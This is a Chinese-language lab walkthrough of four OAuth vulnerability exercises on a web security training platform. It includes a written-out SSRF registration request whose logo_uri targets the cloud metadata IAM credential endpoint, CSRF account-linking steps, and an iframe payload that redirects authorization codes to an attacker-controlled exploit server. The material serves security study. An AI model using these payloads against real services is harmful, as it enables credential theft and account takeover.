日期：2026/8/5                  平台：web安全学院
第一关：
    简单更改POST /authenticate请求中的参数即可，这个实验中没有使用严格的OAuth认证，输入第三方密码之后第三方直接给了本网站一个token，本网站使用token和邮件地址作为参数POST到/authenticate，
    所以简单修改参数即可成功
    
    
第二关：
    通过OpenID动态客户端注册的SSRF
    一、前置知识：
      1、动态客户端注册：按照OpenID（作用是给token）规范，OAuth服务允许客户端（第三方应用）通过/reg端点自己注册自己，无需管理员审核。注册时可以提交redirect_uris（回调域名）和logo_uri（Logo图标地址）
      等元数据。

      2、服务端请求伪造（SSRF）：当你注册时提交了logo_uri，OAuth服务端会把你的client_id存下来。当你访问 /client/{client_id}/logo 时，OAuth服务器并不会从自己的文件系统读取Logo，而是会充当一个
      “代理”——它会主动向你在注册时填写的logo_uri地址发起一次HTTP请求，把拿到的内容（图片）返回给你的浏览器。

      3、云元数据接口：169.254.169.254 是AWS、GCP、Azure等云厂商的内网保留IP。任何拥有该内网访问权限的机器（即OAuth服务器本身），都能直接访问这个地址获取当前云主机的临时IAM密钥。这个接口从公网
      直接访问会被防火墙拦截，但OAuth服务器在“内网”访问它畅通无阻。

    二、步骤
      1、发现第三方的注册端点的路劲是/.well-known/openid-configuration，访问他：
        得到注册路径是/reg
      2、注册，由于可以上传两个url，一个是注册的网站url（回调url），一个是网站logo地址（这个logo并非存在第三方服务器，而是第三方拉取）
        发送：
        POST /reg HTTP/2
        Host: oauth-0a1200170409cbb88034525002b90058.oauth-server.net
        Content-Type: application/json
        Content-Length: 156
        
        {
            "redirect_uris" : [
                "https://aaa.com"
            ],
            "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
        }

        成功注册并得到："client_id":"_goOzwgqxyoEQ3ax_asNh"等信息
      3、访问/client/_goOzwgqxyoEQ3ax_asNh/logo去获取logo，成功得到密钥
第三关：
    在OAuth认证中第三方提供code的同时还要提供一个state来防止CSRF攻击，这个state可以和当前用户的cookie绑定，若是改变了这个state或者直接使用别人的state都会错误
    在这个实验中没有state，并且有绑定社交媒体账号的功能，所以可以将code=....的get请求放在恶意网站中，然后给管理员这个恶意网站点击，使得管理员自动请求目标的code=...的绑定请求，导致我的社交账号绑定admin
    一、正常登录，登录成功后尝试绑定社交媒体账号，正常绑定，数据包中可以看到绑定时有以下请求：
        <img width="962" height="344" alt="image" src="https://github.com/user-attachments/assets/fffae9d7-d693-4057-b4d6-e0c5293788c9" />

        可以看到没有防止CSRF的参数

    二、构造恶意网站
        再次点击绑定，抓包，并有code参数的直接复制，然后drop：
            <img width="562" height="385" alt="image" src="https://github.com/user-attachments/assets/636b8f7f-e2a7-49ff-9207-77e876f74ccd" />


        构造恶意网站，并发送给受害者，使用img：
        <img width="858" height="531" alt="image" src="https://github.com/user-attachments/assets/93f2ef15-b99c-4c84-80dc-4f736bc809a5" />

    三、使用社交媒体账号登录，得到admin权限    


 第四关：
    在这个实验中，使用第三方时候会有请求/auth?client_id=lfrdr5ypjfkv43i1ibweh&redirect_uri=
    https://0aab0037033fc7e680d24eb50056001a.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email，
    之后，完成第三方登录验证就会重定向至redirctURL参数的路径并携带code值
    
    这很正常，但是这个第三方没有验证client_id和redirect_url是否是同一个域名，导致我们可以修改redirect_url为我们的恶意网站地址，使得管理员点击链接后会向我们的恶意网站发送get请求，并且参数为code，
    得到管理员code即可登录，因为他没有code_verifier和 code_challenge来校验这个code是否属于我的

    第一步：
        抓包，得到地址：
            <img width="482" height="281" alt="image" src="https://github.com/user-attachments/assets/d11d6700-ba80-4a69-9299-80469b097c59" />
        将重定向url改为自己的恶意网站地址

    第二步：
        构造恶意网站：
            <iframe src="https://oauth-0a97007e032cc7b480fd4cd502f700f9.oauth-server.net/auth?client_id=lfrdr5ypjfkv43i1ibweh&redirect_uri=
            https://exploit-0a1100f60334c7ca80474df701610022.exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email"></iframe>

    第三步：发送至受害者，并查看日志，得到code：
        <img width="852" height="496" alt="image" src="https://github.com/user-attachments/assets/f27599eb-a11e-470d-b9e0-798a051aeb6f" />

    第四步：使用某个code登录admin成功
    
           
    

